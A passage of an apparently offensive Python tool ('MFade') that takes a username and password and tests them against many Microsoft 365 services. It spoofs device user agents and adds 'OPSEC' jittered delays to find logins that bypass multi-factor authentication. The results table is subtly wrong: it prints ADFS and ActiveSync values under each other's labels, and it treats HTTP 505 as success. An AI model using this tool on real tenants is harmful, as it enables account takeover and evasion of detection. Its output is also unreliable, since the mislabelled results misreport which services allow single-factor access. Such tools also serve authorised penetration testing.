        easlogin = requests.get(easurl, headers=Headers)
        if args.ioc:
            req = (easlogin.url, easlogin.headers.get('date'))
            iocs_instance.add_to_list(req)
        if easlogin.status_code == 505:
            pp.success(f"SUCCESS! {username} successfully authenticated to O365 ActiveSync.")
            pp.success(f"The Windows 10 Mail app can connect to ActiveSync. See https://www.blackhillsinfosec.com/exploiting-mfa-inconsistencies-on-microsoft-services/")
            return True
    except Exception as e:
        pass
    pp.error("Login failed to Microsoft Active Sync")
    return False

def jittered_sleep(stime, jitter=1):
    if args.sleep or args.jitter:
        jitter_range = stime * jitter / 100
        stime += round(random.uniform(-jitter_range, jitter_range), 4)
        if stime < 0:
            stime = -stime
        pp.warning(f"OPSEC: Sleeping {stime} seconds...")
        time.sleep(stime)
        return
    return

def main():
    adfs_domain = False
    adfs_login_success = False
    ews_success = False
    gapi_success = False
    asm_success = False
    mwpw_success = False
    mwpl_success = False
    mwpm_success = False
    mwpa_success = False
    mwpi_success = False
    mwpwp_success = False
    asm_success = False
    as_success = False

    # Updated ASCII art as a raw f-string to fix invalid escape sequence issues.
    ascii_art = rf"""
___  _________        _      
|  \/  ||  ___|      | |     
| .  . || |_ __ _  __| | ___ 
| |\/| ||  _/ _` |/ _` |/ _ \
| |  | || || (_| | (_| |  __/
\_|  |_/\_| \__,_|\__,_|\___|
        Version:{__version__}            
    """
    print(ascii_art)
    print("\n")
    if args.exclude:
        showChecks(args.exclude)
    if args.recon:
        print("\n")
        pp.info(" === Locating ADFS configuration ===")
        root_adfs_url, adfs_domain = reconADFS(args.username)
        if adfs_domain:
            pp.success(f"ADFS is present in the target domain. The authentication url is:\n {root_adfs_url.geturl()}")
            print("\n")
        else:
            pp.error("ADFS is not present in the target domain.")
            print("\n")
    if args.adfs:
        adfs_login_success = authADFS(args.username, args.password)
        jittered_sleep(args.sleep, args.jitter)
    print("########## MICROSOFT API CHECKS ##########")
    if not args.exclude or 'gapi' not in args.exclude.split(','):
        gapi_success = authGAPI(args.username, args.password)
        jittered_sleep(args.sleep, args.jitter)
    if not args.exclude or 'asm' not in args.exclude.split(','):
        asm_success = authASM(args.username, args.password)
        jittered_sleep(args.sleep, args.jitter)
    print("\n")
    print("########## MICROSOFT WEB PORTAL CHECKS ##########")
    if not args.exclude or 'mwp-W' not in args.exclude.split(','):
        mwpw_success = authWP('Windows', args.username, args.password, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.56')
        jittered_sleep(args.sleep, args.jitter)
    if not args.exclude or 'mwp-L' not in args.exclude.split(','):
        mwpl_success = authWP('Linux', args.username, args.password, 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0')
        jittered_sleep(args.sleep, args.jitter)    
    if not args.exclude or 'mwp-M' not in args.exclude.split(','):
        mwpm_success = authWP('Mac OS', args.username, args.password, 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15')
        jittered_sleep(args.sleep, args.jitter)
    if not args.exclude or 'mwp-A' not in args.exclude.split(','):
        mwpa_success = authWP('Android', args.username, args.password, 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Mobile Safari/537.36')
        jittered_sleep(args.sleep, args.jitter)    
    if not args.exclude or 'mwp-I' not in args.exclude.split(','):
        mwpi_success = authWP('iPhone', args.username, args.password, 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1')
        jittered_sleep(args.sleep, args.jitter)
    if not args.exclude or 'mwp-wp' not in args.exclude.split(','):
        mwpwp_success = authWP('Windows Phone', args.username, args.password, 'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 635) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537')
        jittered_sleep(args.sleep, args.jitter)
    print("\n")
    print("########## LEGACY AUTH CHECKS ##########")
    if not args.exclude or 'ews' not in args.exclude.split(','):
        ews_success = authEWS(args.username, args.password)
        jittered_sleep(args.sleep, args.jitter)
    if not args.exclude or 'as' not in args.exclude.split(','):
        as_success = authAS(args.username, args.password)
    print("\n")
    pp.info("=== SINGLE FACTOR ACCESS RESULTS: ===")
    results = f"""
    Microsoft Graph API\t\t\t\t\t{ pp.green("YES") if gapi_success else pp.red("NO")}
    Microsoft Service Management API\t\t\t{ pp.green("YES") if asm_success else pp.red("NO")}
    Microsoft 365 Web Portal w/ Windows User Agent\t{ pp.green("YES") if mwpw_success else pp.red("NO")}
    Microsoft 365 Web Portal w/ Linux User Agent\t{ pp.green("YES") if mwpl_success else pp.red("NO")}
    Microsoft 365 Web Portal w/ Mac OS User Agent\t{ pp.green("YES") if mwpm_success else pp.red("NO")}
    Microsoft 365 Web Portal w/ Android User Agent\t{ pp.green("YES") if mwpa_success else pp.red("NO")}
    Microsoft 365 Web Portal w/ iPhone User Agent\t{ pp.green("YES") if mwpi_success else pp.red("NO")}
    Microsoft 365 Web Portal w/ Win Phone User Agent\t{ pp.green("YES") if mwpwp_success else pp.red("NO")}
    Exchange Web Services\t\t\t\t{pp.green("YES") if ews_success else pp.red("NO")}
    Active Sync\t\t\t\t\t\t{ pp.green("YES") if adfs_domain else pp.red("NO")}
    ADFS found\t\t\t\t\t\t{ pp.green("YES") if adfs_login_success else pp.red("NO")}
    ADFS Auth\t\t\t\t\t\t{ pp.green("YES") if as_success else pp.red("NO")}
    """
    print(results)
    print('\n')
    if args.ioc:
        pp.info('=== IOC Report: ===')
        print('URL:\t|\tTime:')
        for i in iocs_instance.auth_requests:
            print(f"{i[0]}\t |\t{i[1]}")

if __name__ == "__main__":
    main()
